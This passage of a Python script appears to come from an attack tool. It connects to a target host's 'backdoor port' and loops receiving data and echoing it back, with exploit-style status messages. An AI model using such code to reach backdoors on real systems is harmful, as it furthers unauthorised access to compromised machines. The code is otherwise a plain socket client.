try:
    # Create a TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)

    # Connect to the destination host IP and backdoor port
    s.connect((options.dst, int(BACKDOOR_PORT_NUMBER)))

    print('[+] Connection established to backdoor port')

    # Handle interaction with the socket
    while True:
        try:
            # Receive data from the socket
            received_data = s.recv(1024)
            if not received_data:
                print('[+] Connection closed by the remote host')
                break

            # Process the received data (for example, print it)
            print('[*] Received:', received_data.decode())

            # Send data back if needed (e.g., echo)
            s.sendall(received_data)

        except socket.timeout:
            print('[!] Socket read timed out')
            break
        except Exception as e:
            print(f'[!] Error: {e}')
            break

    # Close the socket
    s.close()
except Exception as conn_error:
    print(f'[!] Connection error: {conn_error}')